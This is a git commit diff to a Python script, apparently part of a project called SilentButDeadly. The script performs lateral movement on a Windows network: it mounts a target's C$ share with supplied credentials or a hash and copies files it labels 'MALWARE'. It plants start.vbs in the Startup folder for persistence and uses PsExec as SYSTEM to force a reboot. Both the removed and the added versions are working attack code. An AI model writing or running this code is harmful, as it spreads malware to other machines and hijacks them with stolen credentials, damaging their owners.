d9261339a416668986726015402b31275c181b01
shohatl <96411336+shohatl@users.noreply.github.com>
2023-02-27 14:53:30 +0200

    added ""

--- LateralMovement/transfer.py
+++ LateralMovement/transfer.py
@@ -11,36 +11,31 @@ if __name__ == '__main__':
     print(user)
     password = input("enter hash")
     print(password)
-    run = True
-    while run:
-        try:
-            os.popen('Net use * /delete /Y').read()
-            print('STARTING')
-            os.popen(r"Net use h: \\" + ip + r"\c$ /user:" + user + r" " + password + " /p:yes").read()
-            print("CONNECTED")
-            run = False
-        except:
-            print("didn't initiate connection")
-    run = True
-    while run:
-        try:
-            print(str(os.popen(
-                r'xcopy "' + path + r'"\*.* "h:\SilentButDeadly(CyberProject)\LateralMovement"  /E /H /C /I /Y').read()))
-            print("COPIED MALWARE")
-            print(str(os.popen(r'copy start.vbs "h:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" /Y')))
-            print('COPIED STARTUP')
-            run = False
-        except:
-            print("didn't copy malware")
-    run = True
-    while run:
-        try:
-            print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
-            print(str(os.popen(
-                r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
-            print('DONE')
-            run = False
-        except:
-            print('failed to run')
+
+    try:
+        os.popen('Net use * /delete /Y').read()
+        print('STARTING')
+        os.popen('Net use h: \\' + ip + r'\c$ /user:"' + user + r'" "' + password + '"-* /p:yes').read()
+        print("CONNECTED")
+        run = False
+    except:
+        print("didn't initiate connection")
+
+    try:
+        print(str(os.popen(
+            r'xcopy "' + path + r'"\*.* "h:\SilentButDeadly(CyberProject)\LateralMovement"  /E /H /C /I /Y').read()))
+        print("COPIED MALWARE")
+        print(str(os.popen(r'copy start.vbs "h:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" /Y')))
+        print('COPIED STARTUP')
+    except:
+        print("didn't copy malware")
+
+    try:
+        print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
+        print(str(os.popen(
+            r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
+        print('DONE')
+    except:
+        print('failed to run')
     os.popen('Net use * /delete /Y').read()
     print('DONE')
